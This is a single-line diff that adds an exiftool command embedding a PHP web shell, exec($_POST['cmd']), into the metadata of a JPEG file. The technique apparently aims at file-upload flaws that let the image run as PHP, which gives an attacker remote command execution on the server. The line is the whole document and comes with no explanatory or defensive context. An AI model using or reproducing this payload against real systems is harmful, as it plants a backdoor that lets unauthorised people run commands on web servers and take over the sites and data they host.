@@ -1,0 +1,1 @@
+exiftool index.jpg -documentname="<?php echo exec(\$_POST['cmd']); ?>"
